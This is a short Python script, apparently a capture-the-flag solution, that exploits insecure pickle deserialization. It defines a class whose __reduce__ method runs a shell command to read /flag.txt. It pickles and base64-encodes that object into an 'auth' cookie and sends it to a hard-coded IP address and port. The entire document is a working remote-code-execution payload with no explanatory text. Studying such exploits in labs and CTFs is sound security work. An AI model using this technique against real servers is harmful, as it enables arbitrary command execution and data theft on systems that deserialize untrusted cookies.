import requests
import pickle
import subprocess
import base64

class Exploit(object):
    def __reduce__(self):
        return subprocess.check_output, (['cat', '/flag.txt'], )

url = "http://94.237.59.180:41387"

data = {
    "username": Exploit()
}

headers = {
    "Cookie": b"auth=" + base64.b64encode(pickle.dumps(data))
}

r = requests.get(url + "/home", headers=headers)

print(r.text)